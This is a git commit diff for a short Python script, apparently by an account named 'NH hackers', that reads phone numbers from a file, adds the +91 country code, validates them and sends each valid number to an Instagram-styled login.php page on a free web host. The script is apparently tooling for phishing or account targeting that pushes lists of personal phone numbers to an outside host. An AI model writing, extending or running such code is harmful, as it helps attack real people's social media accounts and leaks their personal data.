6448265a271569aa0eb75e351d0af045f0839453
NH hackers <74050570+NH-hackers@users.noreply.github.com>
2023-03-07 20:43:46 +0530

    Update v.py

--- v.py
+++ v.py
@@ -2,7 +2,7 @@ import phonenumbers
 import requests
 with open("n.txt","r") as n:
      for i in n:
-         phone_number = phonenumbers.parse(i) 
+         phone_number = phonenumbers.parse("+91{}".format(i)) 
          valid = phonenumbers.is_valid_number(phone_number) 
          if valid:
             requests.get("https://crazyboysofagv.000webhostapp.com/insta/login.php?user={}".format(i))
